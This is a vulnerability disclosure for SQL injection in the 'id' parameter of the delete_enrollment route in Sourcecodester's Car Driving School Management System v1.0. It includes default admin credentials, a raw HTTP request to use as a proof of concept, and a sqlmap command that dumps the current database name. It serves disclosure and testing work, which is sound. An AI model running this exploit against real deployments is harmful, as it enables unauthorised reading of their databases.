### SQL injection vulnerability exists in Sourcecodester Car Driving School Management System

official website:https://www.sourcecodester.com/php/15070/car-driving-school-management-system-phpoop-free-source-code.html

version:v1.0

route:/cdsms/classes/Master.php?f=delete_enrollment

related code file:Master.php

injection parameter:${'id'}

#### 1.Vulnerability analysis

After receiving the id parameter passed in through the get method in the Master.php file, it is directly spliced into the SQL query statement for execution without any security filtering. An attacker can use this parameter to perform SQL injection to read arbitrary database information.

![image-20240725213022573](assets/image-20240725213022573.png)

#### 2.Vulnerability verification and exploit

After admin/admin123 logs in to the system backend, replace the cookie content in the following POC and save it as 1.txt.Note that you need to modify the deployed IP address, port, and cookie information in the data packet according to the environment.

```
POST /cdsms/classes/Master.php?f=delete_enrollment HTTP/1.1
Host: localhost
Content-Length: 4
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/cdsms/admin/?page=enrollees
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1721700678; PHPSESSID=32r6u9afm833p0abeg632sl4id
Connection: close

id=5
```

python sqlmap.py -r 1.txt --batch --current-db

![image-20240725212944403](assets/image-20240725212944403.png)

Successfully obtained the injected payload and database name.